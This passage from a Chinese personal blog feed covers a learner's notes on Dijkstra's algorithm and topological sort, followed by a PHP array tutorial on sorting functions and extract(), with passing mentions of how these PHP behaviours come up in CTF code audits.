title="“朴素算法”"></a>“朴素算法”</h4><p>这个算法是我自己命名的。无权图的最短路径其实可以视为权重均为1的有权图，是一种有权图的特殊情况。由于实际情况中应用较少，且完全可以用处理有权图的迪杰斯特拉算法兼容，我们这里先暂时跳过介绍该算法。（兴许以后有时间会补上）</p><h4 id="迪杰斯特拉-Dijkstra算法"><a href="#迪杰斯特拉-Dijkstra算法" class="headerlink" title="迪杰斯特拉&#x2F;Dijkstra算法"></a>迪杰斯特拉&#x2F;Dijkstra算法</h4><p>迪杰斯塔拉算法是一个经典而伟大的算法，经过一个星期的咀嚼我觉得已经悟的差不多了。传统的BFS算法无法解决最短路径问题，因为它无法保证队列前面的顶点是最接近源点s的顶点。因此，应用这个算法我们还需要两种辅助的数据结构。</p><ul><li>具有三列（每行对应一个顶点）的一个距离表<ul><li>顶点的序号&#x2F;名称</li><li>距离源顶点的距离Distance[v]。源点到自身的距离为0，其余顶点在距离表中的距离被初始化为-1。</li><li>路径Path[v]——包含抵达该顶点的前驱顶点的名称，通过该顶点我们可以得到最短距离。</li></ul></li><li>优先队列。使用优先队列来储存尚未被处理的顶点，并始终弹出距离源顶点最短距离的顶点先处理，符合贪心原则。这里我们采用的是基于二项堆实现的优先队列。</li></ul><p>算法结束时，距离表中将储存所有顶点到达源顶点的最短距离。同时我们可以根据距离表中每个顶点对应的前驱顶点往前追溯直到回到源点为止，这个过程所经过的路径实际上就是源点到达该点的最短路径（由于我们是从终点向起点追溯，你也可以称为是选定顶点到源点的最短路径）。</p><p>关于迪杰斯特拉算法有以下三点需要特别注意：</p><ul><li>它使用了贪婪法：总是选择下一个距离源点最近的顶点。</li><li>利用优先队列来实现贪婪，按照当前距离s的距离大小来储存还未确定最短路径的节点。</li><li>迪杰斯特拉算法不适用于处理带有负权重的有权图。</li></ul><p>接下来我们给出迪杰斯特拉算法的伪代码实现（因为表示图的方法不同，所以只好用伪代码表示）。</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">Dijkstra</span><span class="params">(<span class="keyword">struct</span> Graph*G,<span class="type">int</span> s)</span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">PriorityQueue</span>*<span class="title">PQ</span>=</span>CreatPriorityQueue();</span><br><span class="line">    <span class="type">int</span> v,w;</span><br><span class="line"></span><br><span class="line">    EnQueue(PQ,s);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; G-&gt;V; ++i) &#123;</span><br><span class="line">        Distance[i]=<span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    Distance[s]=<span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (!IsEmptyQueue(PQ))&#123;</span><br><span class="line">        v=DeleteMin(PQ);</span><br><span class="line">        对于顶点v的所有邻接顶点w&#123;</span><br><span class="line">            计算新距离d=Distance[v]+weight[v][w];</span><br><span class="line">            <span class="keyword">if</span>(Distance[w]==<span class="number">-1</span>)&#123;<span class="comment">//说明该邻接顶点还未确定最短路径</span></span><br><span class="line">                Distance[w]=new distance d;</span><br><span class="line">                将具有优先级d的顶点w插入优先队列中</span><br><span class="line">                Path[w]=v;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span>(Distance[w]&gt;new distance d)&#123;<span class="comment">//说明经过该邻接顶点的路径比之前已经确定的最短路径更优</span></span><br><span class="line">                Distance[w]=new distance d;</span><br><span class="line">                将w的优先级更新为d;</span><br><span class="line">                Path[w]=v</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="更详细的解释"><a href="#更详细的解释" class="headerlink" title="更详细的解释"></a>更详细的解释</h5><p>我对于迪杰斯特拉算法的理解，其实就是贪心+层次遍历&#x2F;BFS。该算法利用BFS将顶点全部存入队列中遍历处理，但是由于贪心的需要所以采用优先队列保证每次先处理距离源点最近的顶点，计算其距离看是否会得到更小的距离。如果该顶点还未确认最短路径（Distance[w]&#x3D;&#x3D;-1）就暂且默认该路径为最短路径，更新距离表；如果能使得路径更短（Distance[w]&gt;new distance d），说明经过该邻接顶点的路径比之前已经确定的最短路径更优，就重置节点优先级（更新优先队列）并更新距离表。这样最后距离表就能得到源顶点到其他所有顶点的最短路径。</p><p>这里我按照邻接表的结构完善了伪代码，这里放出来仅供参考。</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">Dijkstra</span><span class="params">(<span class="keyword">struct</span> Graph* G, <span class="type">int</span> s, <span class="keyword">struct</span> DistanceMap* <span class="built_in">map</span>)</span> &#123;<span class="comment">//传入图和距离表</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">Heap</span>* <span class="title">h</span> =</span> CreatHeap(G-&gt;V, MIN_HEAP);<span class="comment">//创建堆作为优先队列辅助</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">ListNode</span>* <span class="title">temp</span>;</span><span class="comment">//建立临时节点来储存邻接顶点</span></span><br><span class="line">    <span class="type">int</span> v, w, d;<span class="comment">//分别表示当前顶点，当前顶点的邻接顶点，两者的距离</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; G-&gt;V; ++i) &#123;<span class="comment">//初始化距离表</span></span><br><span class="line">        <span class="built_in">map</span>[i].vertexNumber = i;</span><br><span class="line">        <span class="built_in">map</span>[i].Distance = <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">map</span>[s].Distance = <span class="number">0</span>;<span class="comment">//设置源顶点距离为0</span></span><br><span class="line">    <span class="built_in">map</span>[s].Path = s;<span class="comment">//默认源顶点的路径为其本身</span></span><br><span class="line">    Insert(h, s, <span class="built_in">map</span>);<span class="comment">//将源顶点插入优先队列中</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (!IsEmptyHeap(h)) &#123;</span><br><span class="line">        v = DeleteElement(h, <span class="built_in">map</span>);<span class="comment">//弹出最小距离的顶点，开始贪心</span></span><br><span class="line">        temp = &amp;G-&gt;Adj[v];</span><br><span class="line">        <span class="keyword">while</span> (temp-&gt;next-&gt;vertexNumber != v) &#123;</span><br><span class="line">            temp = temp-&gt;next;<span class="comment">//temp储存邻接顶点</span></span><br><span class="line">            w = temp-&gt;vertexNumber;<span class="comment">//w表示邻接顶点的顶点序号</span></span><br><span class="line">            d = <span class="built_in">map</span>[v].Distance + temp-&gt;dis;<span class="comment">//邻接顶点到源点的距离计算为v顶点到源点的距离加上邻接顶点w到v顶点的距离</span></span><br><span class="line">            <span class="keyword">if</span> (<span class="built_in">map</span>[w].Distance == <span class="number">-1</span>) &#123;<span class="comment">//邻接顶点未确定最短路径的情况</span></span><br><span class="line">                <span class="built_in">map</span>[w].Distance = d;</span><br><span class="line">                Insert(h, w, <span class="built_in">map</span>);</span><br><span class="line">                <span class="built_in">map</span>[w].Path = v;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (<span class="built_in">map</span>[w].Distance &gt; d) &#123;<span class="comment">//邻接顶点已经确认最短路径但是出现了更优路径都是情况</span></span><br><span class="line">                <span class="built_in">map</span>[w].Distance = d;</span><br><span class="line">                PercolateDown(h, <span class="number">0</span>, <span class="built_in">map</span>);<span class="comment">//更新优先队列</span></span><br><span class="line">                <span class="built_in">map</span>[w].Path = v;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    DestroyHeap(h);<span class="comment">//销毁优先队列</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="不足之处"><a href="#不足之处" class="headerlink" title="不足之处"></a>不足之处</h5><p>迪杰斯特拉算法主要有以下两个问题。</p><ul><li>该算法本质上是基于贪心的盲目搜索，会浪费时间和必要的资源。</li><li>该算法不能处理负权重的边，这种情况下要采用贝尔曼-福特&#x2F;Bellman-Ford算法。</li></ul><h4 id="贝尔曼-福特-Bellman-Ford算法"><a href="#贝尔曼-福特-Bellman-Ford算法" class="headerlink" title="贝尔曼-福特&#x2F;Bellman-Ford算法"></a>贝尔曼-福特&#x2F;Bellman-Ford算法</h4><p>关于这一部分，我这本书上讲的不是一般的烂，给出的算法无法处理负权环，所以暂时就先跳过这一部分（再次给朋友们避雷这个叫纳拉辛哈·卡路曼希的印度人写的C语言数据结构书）。</p><p>这里放出WAHAHA佬对于Bellman-Ford算法的博客，可以先用这篇文章作为代餐：<a href="https://gngtwhh.github.io/2023-11-30-9ab73a7c6d7f/">Bellman-Ford算法 | WAHAHA’s blog (gngtwhh.github.io)</a>。</p><h3 id="拓扑排序"><a href="#拓扑排序" class="headerlink" title="拓扑排序"></a>拓扑排序</h3><p>拓扑排序是个很有趣的东西。比起一般的图结构和排序，它特殊在是用边来表示信息的。</p><p>给定一个<em>有向无环图（DAG）</em>。</p><p><img src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/f805b876f56a464895ba1c78db777c7d.png" alt="有向无环图"></p><p>我们假设这是大学的课程先决条件，其中的有向边(v,w)表示必须要先完成课程v才能学习课程w。在这种情况下，拓扑排序就是不违背先决条件的课程学习顺序。每个DAG可能有一个或者多个拓扑排序序列，比如对于上图A-&gt;B-&gt;D-&gt;C和A-&gt;C-&gt;B-&gt;D都是合理的拓扑排序。前提是该图不能存在回路，否则拓扑排序将不存在，因为此时v将先于w同时w也会先于v。</p><p>拓扑排序还有一个有趣的性质，如果排序中所有连续的顶点构成的顶点对之间都通过边来联系，那么这些边构成DAG中一个有向的哈密尔顿路径，此时拓扑排序唯一。（哈密尔顿路径后续随缘更新……）</p><p>那么我们如何实现拓扑排序的算法呢？以下是我的一些思路。首先对于所有顶点计算其<em>入度</em>，然后从入度为0的点开始处理。这意味着拓扑排序将从没有先决条件的顶点开始。为了跟踪这些顶点，我们用队列来储存这些顶点。</p><p>入度为0的顶点都存入队列中，当队列不为空时，队首顶点v出列，并且由v发出的边到达的所有邻接顶点入度全部减1.如果有顶点因此入度减小到了0（说明先决条件全部被满足），该顶点就被存入队列中。拓扑排序就是顶点的出队顺序。</p><p>以下给出拓扑排序的伪代码实现。</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">TopologicalSort</span><span class="params">(<span class="keyword">struct</span> Graph*G)</span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">Queue</span>*<span class="title">Q</span>;</span></span><br><span class="line">    <span class="type">int</span> counter;</span><br><span class="line">    <span class="type">int</span> v,m;</span><br><span class="line">    Q=CreatQueue();</span><br><span class="line">    counter=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> v = <span class="number">0</span>; v &lt; G-&gt;V; ++v) &#123;</span><br><span class="line">        <span class="keyword">if</span> (indegree[v] == <span class="number">0</span>)</span><br><span class="line">            EnQueue(Q, v);</span><br><span class="line">    &#125;</span><br><span class="line">        <span class="keyword">while</span> (!IsEmptyQueue(Q))&#123;</span><br><span class="line">            v=DeQueue(Q);</span><br><span class="line">            topologicalOrder[v]=++counter;<span class="comment">//出队顺序序号</span></span><br><span class="line">            对于邻接v的每个w&#123;</span><br><span class="line">                <span class="keyword">if</span>(--indegree[w]==<span class="number">0</span>)</span><br><span class="line">                    EnQueue(Q,w);</span><br><span class="line">            &#125;;</span><br><span class="line">        &#125;</span><br><span class="line">    <span class="keyword">if</span>(counter!=G-&gt;V)</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Graph has circle!\n&quot;</span>);</span><br><span class="line">    DeleteQueue(Q);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><hr><p>（待更新……）</p><p><img src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/River%20&%20Faye.png" alt="River &amp; Faye"></p>]]></content>
    
    
    <summary type="html">连一刻也没有为树的结束哀悼，立刻赶来战场的是——图！</summary>
    
    
    
    <category term="数据结构学习" scheme="http://example.com/categories/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%AD%A6%E4%B9%A0/"/>
    
    
    <category term="图" scheme="http://example.com/tags/%E5%9B%BE/"/>
    
  </entry>
  
  <entry>
    <title>PHP碎碎念（三）——数组那些事</title>
    <link href="http://example.com/2023/11/09/PHP%E5%AD%A6%E4%B9%A0/PHP%E7%A2%8E%E7%A2%8E%E5%BF%B5%EF%BC%88%E4%B8%89%EF%BC%89%E2%80%94%E2%80%94%E6%95%B0%E7%BB%84%E9%82%A3%E4%BA%9B%E4%BA%8B/"/>
    <id>http://example.com/2023/11/09/PHP%E5%AD%A6%E4%B9%A0/PHP%E7%A2%8E%E7%A2%8E%E5%BF%B5%EF%BC%88%E4%B8%89%EF%BC%89%E2%80%94%E2%80%94%E6%95%B0%E7%BB%84%E9%82%A3%E4%BA%9B%E4%BA%8B/</id>
    <published>2023-11-09T15:01:01.000Z</published>
    <updated>2023-11-09T15:03:24.000Z</updated>
    
    <content type="html"><![CDATA[<p>和其他语言一样，PHP也有数组。但是不同于C语言，PHP的数组更加灵活而且方法更加多样化，这一点类似于Python中的字典。主要是因为PHP的数组可以不局限于数字索引，也就是说数组允许自定义索引。</p><p>话不多说，进入正题。我们先从数字索引数组开始介绍，然后再讲自定义索引数组，最后介绍一些处理数组的方法。</p><h2 id="数字索引数组"><a href="#数字索引数组" class="headerlink" title="数字索引数组"></a>数字索引数组</h2><p>和大多数编程语言一样，在PHP中的数字数组索引也是从0开始的。当然，这一点可以更改。</p><h3 id="初始化"><a href="#初始化" class="headerlink" title="初始化"></a>初始化</h3><p>PHP数组的初始化有以下几种方法</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$name</span>=<span class="keyword">array</span>(<span class="string">&#x27;Adam&#x27;</span>,<span class="string">&#x27;Ben&#x27;</span>,<span class="string">&#x27;JJG&#x27;</span>);</span><br><span class="line"><span class="variable">$name</span>=[<span class="string">&#x27;Adam&#x27;</span>,<span class="string">&#x27;Ben&#x27;</span>,<span class="string">&#x27;JJG&#x27;</span>];<span class="comment">//PHP5.4版本后支持</span></span><br><span class="line"><span class="variable">$name</span>=<span class="title function_ invoke__">range</span>(<span class="number">1</span>,<span class="number">10</span>);<span class="comment">//储存1到10的数字</span></span><br><span class="line"><span class="variable">$name</span>=<span class="title function_ invoke__">range</span>(<span class="string">&#x27;a&#x27;</span>,<span class="string">&#x27;z&#x27;</span>);<span class="comment">//储存字符a到z</span></span><br><span class="line"><span class="variable">$name</span>=<span class="title function_ invoke__">file</span>(<span class="string">&quot;outputs.txt&quot;</span>);<span class="comment">//从文件导入数组，每一行作为一个元素</span></span><br></pre></td></tr></table></figure><p>后面几种声明数组的方式看起来有点像Python中的列表，但是要注意这两者并不是完全相同。比如range()函数，在PHP中<code>range(1,10)</code>是输出1到10，而Python则是输出1到9,10的边界是一个开集。</p><p>最后提到的从文件导入数组用到了第二章提到过的file()函数，详细内容可以回看一下第二章。</p><p>另外，PHP支持数组间等号的重载，如果你想把一个数组中的数据保存在另一个数组中，直接使用等号就行。</p><h3 id="访问数组"><a href="#访问数组" class="headerlink" title="访问数组"></a>访问数组</h3><p>这部分和C等其他语言的规则大致相同，不多赘述。你可以使用<code>$name[0]</code>来访问第一个元素，但是PHP也允许你用{}大括号来代替中括号。</p><p>另外，PHP的数组长度是动态的，和Python和C都不太一样。在C中你需要实现指定数组的长度，Python中添加元素需要调用列表的方法append()，但是在PHP中允许你直接声明一个新的元素。</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$name</span>[<span class="number">4</span>]=<span class="string">&#x27;jjg&#x27;</span><span class="comment">//这行代码会直接为$name数组添加第四个元素</span></span><br></pre></td></tr></table></figure><p>如果下标相同，等同于更改原索引对应的数组值。如果这个数组一开始并不存在，PHP会创建一个只包含一个元素的新的数组。</p><h4 id="循环访问数组"><a href="#循环访问数组" class="headerlink" title="循环访问数组"></a>循环访问数组</h4><p>我们之前提到了通过数组下标来访问数组，但是正如其他语言中一样，PHP也可以使用循环来访问数组，效率更高也更强大，下面介绍几个循环函数。</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> (<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span>&lt;<span class="number">3</span>; <span class="variable">$i</span>++)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$name</span>[<span class="variable">$i</span>].<span class="string">&quot; &quot;</span>;</span><br><span class="line">&#125;<span class="comment">//经典的for循环，和C语言一样的语法，但是不适用于自定义索引数组</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span> (<span class="variable">$name</span> <span class="keyword">as</span> <span class="variable">$n</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$n</span>.<span class="string">&quot; &quot;</span>;</span><br><span class="line">&#125;<span class="comment">//foreach是PHP中的特性函数，允许$n表示数组中的每一个元素，减少了手工输入量，非常方便</span></span><br></pre></td></tr></table></figure><h2 id="自定义索引数组"><a href="#自定义索引数组" class="headerlink" title="自定义索引数组"></a>自定义索引数组</h2><p>正如我们前文提到的那样，PHP可以自定义索引，其创建方法类似于Python中的字典，也就是包含一个键名和对应的值。下面是自定义索引数组的创建方法.</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$names</span>=<span class="keyword">array</span>(<span class="string">&#x27;fname&#x27;</span>=&gt;<span class="string">&#x27;Adam&#x27;</span>,<span class="string">&#x27;lname&#x27;</span>=&gt;<span class="string">&#x27;Ben&#x27;</span>,<span class="string">&#x27;nname&#x27;</span>=&gt;<span class="string">&#x27;jjg&#x27;</span>);</span><br><span class="line"><span class="variable">$names</span>[<span class="string">&#x27;nname&#x27;</span>]=<span class="string">&#x27;JJG&#x27;</span>;</span><br></pre></td></tr></table></figure><p>键和值之间的连接符号是<code>=&gt;</code>，有点奇怪，挺象形的只能说。</p><p>由于数组的索引不再是整数，所以使用for循环访问数组元素的时候，就不能简单的使用经典的for循环，而要使用foreach循环或者each()和list()结构。</p><p>形式如下。</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">foreach</span>(<span class="variable">$names</span> <span class="keyword">as</span> <span class="variable">$key</span>=&gt;<span class="variable">$value</span>)&#123;<span class="comment">//这里用$key和$value分别代表数组中一个元素的键名和值</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$key</span>.<span class="string">&quot; - &quot;</span>.<span class="variable">$value</span>.<span class="string">&quot;&lt;br /&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span>(<span class="variable">$e</span> = <span class="title function_ invoke__">each</span>(<span class="variable">$names</span>))&#123;<span class="comment">//each()函数会返回数组当前所指元素，然后指向下一个元素</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$e</span>[<span class="string">&#x27;key&#x27;</span>].<span class="string">&quot; - &quot;</span>.<span class="variable">$e</span>[<span class="string">&#x27;value&#x27;</span>];</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;br /&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">reset</span>(<span class="variable">$names</span>);<span class="comment">//数组会记得自己指向了哪个元素，如果想再次循环遍历该数组，需要使用reset()函数将数组指针重新指向首元素</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span>(<span class="keyword">list</span>(<span class="variable">$a</span>,<span class="variable">$b</span>)=<span class="title function_ invoke__">each</span>(<span class="variable">$names</span>))&#123;<span class="comment">//比上面的方式更好，list()会把元素分离成两部分并将其储存在两个新变量中</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$a</span>.<span class="string">&quot; - &quot;</span>.<span class="variable">$b</span>.<span class="string">&quot;&lt;br /&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="数组操作符"><a href="#数组操作符" class="headerlink" title="数组操作符"></a>数组操作符</h2><p>PHP有一组对数组的操作符，大多数这些操作符都有与之对应的标量操作符，将其整理如下。</p><table><thead><tr><th>操作符</th><th>名称</th><th>实例</th><th>结果</th></tr></thead><tbody><tr><td>+</td><td>联合</td><td>$a+$b</td><td>数组a、b联合。将数组b中的元素添加到数组a中。如果键名冲突该元素将不会被添加。</td></tr><tr><td>&#x3D;&#x3D;</td><td>等价</td><td>$a&#x3D;&#x3D;$b</td><td>如果数组a、b<strong>包含相同元素</strong>，返回true</td></tr><tr><td>&#x3D;&#x3D;&#x3D;</td><td>恒等</td><td>$a&#x3D;&#x3D;&#x3D;$b</td><td>如果数组a、b<strong>包含相同顺序和类型的元素</strong>，返回true</td></tr><tr><td>!&#x3D;</td><td>不等价</td><td>$a!&#x3D;$b</td><td>不包含相同元素</td></tr><tr><td>&lt;&gt;</td><td>不等价</td><td>$a&lt;&gt;$b</td><td>和!&#x3D;相同</td></tr><tr><td>!&#x3D;&#x3D;</td><td>不恒等</td><td>$a!&#x3D;&#x3D;$b</td><td>不恒等</td></tr></tbody></table><p>这些操作符也可以拿来比较标量，一般来说数组和标量无法比较，会抛出一个false。利用这一点可以在某些CTF的PHP代码审计中绕过一些判定方法，比如传入一个数组和某个非数组值进行比较。</p><h2 id="多维数组"><a href="#多维数组" class="headerlink" title="多维数组"></a>多维数组</h2><p>关于多维数组的部分不过多展开，一来这部分比较晦涩复杂，平时最多用到二维数组，极少用到三维数组；二是多维数组的概念和C等语言类似，没必要多开篇幅介绍。在PHP中多维数组就是简单的数组嵌套，用多个array()函数嵌套即可声明一个多维数组。</p><p>除了多维数组的概念，关于一些多维数组的操作（如排序）也将暂时跳过。</p><h2 id="数组排序"><a href="#数组排序" class="headerlink" title="数组排序"></a>数组排序</h2><p>在PHP中定义了许多有用的方法来对数组进行排序，而不用想C语言一样造轮子。</p><h3 id="sort"><a href="#sort" class="headerlink" title="sort()"></a>sort()</h3><p>sort()是一个功能强大的函数：无论是字符串数组还是数字数组，都将按照升序排列进行排序。其中字母排序区分字母大小写，大写字母永远在小写字母前面，即按照ASCII码进行排序。同理，数字永远排在字母前面。</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$names</span>=[<span class="string">&#x27;a&#x27;</span>,<span class="string">&#x27;b&#x27;</span>,<span class="string">&#x27;1a&#x27;</span>,<span class="string">&#x27;2a&#x27;</span>,<span class="string">&#x27;A&#x27;</span>,<span class="string">&#x27;B&#x27;</span>];</span><br><span class="line"><span class="title function_ invoke__">print_r</span>(<span class="variable">$names</span>);</span><br><span class="line"><span class="title function_ invoke__">sort</span>(<span class="variable">$names</span>);</span><br><span class="line"><span class="title function_ invoke__">print_r</span>(<span class="variable">$names</span>);</span><br></pre></td></tr></table></figure><p><img src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20231109220142615.png" alt="image-20231109220142615"></p><p>sort()函数的第二个参数是可选的。这些参数是SORT_REGULAR、SORT_NUMBERIC、SORT_STRING、SORT_LOCAL_STRING、SORT_NATURAL、SORT_FLAG_CASE。这些参数虽然很有用，但是实际上很少用到（至少在CTF从来没碰到过）。贴了一段别的大佬博客归纳。</p><blockquote><ol><li>SORT_REGULAR：按照常规比较方式排序（不改变类型）</li><li>SORT_NUMERIC：按照数值比较方式排序</li><li>SORT_STRING：按照字符串比较方式排序</li><li>SORT_LOCALE_STRING：按照本地化字符串比较方式排序</li><li>SORT_NATURAL：按自然顺序对字符串进行排序(与SORT_STRING相同),同时不区分大小写</li><li>SORT_FLAG_CASE：可以联合使用喜欢SORT_STRING或SORT_NATURAL，在进行字母的比较时不区分大小写</li></ol></blockquote><p>要实现降序排序也很简单，使用rsort()函数即可将元素按照降序顺序排列。</p><h3 id="asort-和ksort"><a href="#asort-和ksort" class="headerlink" title="asort()和ksort()"></a>asort()和ksort()</h3><p>这两个函数作用机理和sort()函数相同，只是作用对象为自定义索引数组。如果你想根据键名来排序，选择ksort()，否则选择asort()来按照元素的值进行排序。如果想要按照降序排序也一样可以使用arsort()或者krsort()函数。</p><h3 id="usort"><a href="#usort" class="headerlink" title="usort()"></a>usort()</h3><p>usort()中的‘u’代表‘user’，意味着这是个由用户自定义的排序函数。在使用这个函数时，首先要自定义一个比较函数，比如我需要按照一个数组的第三项去进行排序，我可以编写如下代码。</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">compare</span>(<span class="params"><span class="variable">$x</span>,<span class="variable">$y</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$x</span>[<span class="number">1</span>]==<span class="variable">$y</span>[<span class="number">1</span>])&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;<span class="keyword">elseif</span> (<span class="variable">$x</span>[<span class="number">1</span>]&lt;<span class="variable">$y</span>[<span class="number">1</span>])&#123;</span><br><span class="line">        <span class="keyword">return</span> -<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">usort</span>(<span class="variable">$names</span>,<span class="string">&#x27;compare&#x27;</span>);<span class="comment">//传入待排序的数组和自定义比较函数名</span></span><br></pre></td></tr></table></figure><p>调用usort()函数没有反向变体，但是你可以直接修改自定义比较函数的返回值达到反向排序的效果。</p><h3 id="shuffle"><a href="#shuffle" class="headerlink" title="shuffle()"></a>shuffle()</h3><p>向shuffle()函数传入数组，它会将数组元素顺序打乱随机排序。</p><h3 id="array-reverse"><a href="#array-reverse" class="headerlink" title="array_reverse()"></a>array_reverse()</h3><p>array_reverse()函数会将数组按照与原来的排序相反的顺序进行排序，但是这个函数只返回排序后数组的副本，不会改变原数组。要改变原数组，将返回值赋予原数组就好。</p><h2 id="其他数组操作"><a href="#其他数组操作" class="headerlink" title="其他数组操作"></a>其他数组操作</h2><p>除了以上介绍的这些处理数组的函数，还有一些函数也很有用，这里就简要的介绍一下。</p><h3 id="explode"><a href="#explode" class="headerlink" title="explode()"></a>explode()</h3><p>向函数传递一个分隔符和字符串，可以将字符串根据分隔符分隔为不同的元素并作为数组返回。</p><h3 id="each-和next-和current"><a href="#each-和next-和current" class="headerlink" title="each()和next()和current()"></a>each()和next()和current()</h3><p>在前文介绍了each()函数会返回数组当前所指值并指向下一个元素，而next()则是直接指向下一个元素再返回元素值。current()函数则是返回目前数组指向元素的值。</p><h3 id="reset-和end"><a href="#reset-和end" class="headerlink" title="reset()和end()"></a>reset()和end()</h3><p>前文介绍过reset()函数会重置数组指针并返回第一个数组元素值，而end()函数则刚好相反：它直接指向最后一个元素并返回最后一个元素值。</p><h3 id="prev-和pos"><a href="#prev-和pos" class="headerlink" title="prev()和pos()"></a>prev()和pos()</h3><p>prev()函数和next()函数相反，它将指针回移一位并返回所指值。而pos()函数则是current()函数的别名。</p><h3 id="count-sizeof-和array-count-values"><a href="#count-sizeof-和array-count-values" class="headerlink" title="count()&#x2F;sizeof()和array_count_values()"></a>count()&#x2F;sizeof()和array_count_values()</h3><p>count()函数返回数组中元素的个数，sizeof()函数是它的一个别名。而array_count_values()则返回一个数组，内含传入数组元素的出现频率表，统计每个元素在该数组中出现的次数。</p><h3 id="extract"><a href="#extract" class="headerlink" title="extract()"></a>extract()</h3><p>这个函数很有意思，它会把数组中的关键字-值对转换成一系列标量变量。具体用法如下。</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$names</span>=<span class="keyword">array</span>(<span class="string">&#x27;fname&#x27;</span>=&gt;<span class="string">&#x27;Adam&#x27;</span>,<span class="string">&#x27;lname&#x27;</span>=&gt;<span class="string">&#x27;Ben&#x27;</span>,<span class="string">&#x27;nname&#x27;</span>=&gt;<span class="string">&#x27;JJG&#x27;</span>);</span><br><span class="line"><span class="variable">$nname</span>=<span class="string">&#x27;jjg&#x27;</span>;</span><br><span class="line"><span class="title function_ invoke__">extract</span>(<span class="variable">$names</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$fname</span>.<span class="string">&quot;\n&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$lname</span>.<span class="string">&quot;\n&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$nname</span>.<span class="string">&quot;\n&quot;</span>;</span><br></pre></td></tr></table></figure><p><img src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20231109225232660.png" alt="image-20231109225232660"></p><p>值得注意的是，如果当前已经存在和数组关键字相同名称的变量，该变量值会被覆盖。也就是说通过extract()函数可以覆盖掉一些原本存在的变量值达到注入的效果。这一点在CTF的PHP代码审计中经常用到（划考点）。</p><p>不过extract()函数将元素转换为变量的前提是该元素的关键字必须符合PHP变量命名规范，也就是说以数字开头和包含空格的关键字将被跳过。</p><p>extract()函数还可以传递第二个参数extract_type，这里不多赘述，贴一段其他大佬的归纳总结。</p><blockquote><p><em>extract_type</em> - 可选项。<code>extract()</code>函数检查无效变量名称和与现有变量名称的冲突。 此参数指定如何处理无效和碰撞名称。可能的值 -</p><ul><li><em>EXTR_OVERWRITE</em> - 默认。 碰撞时，现有变量被覆盖。</li><li><em>EXTR_SKIP</em> - 碰撞时，现有的变量不会被覆盖</li><li><em>EXTR_PREFIX_SAME</em> - 碰撞时，变量名将被赋予一个前缀。</li><li><em>EXTR_PREFIX_ALL</em> - 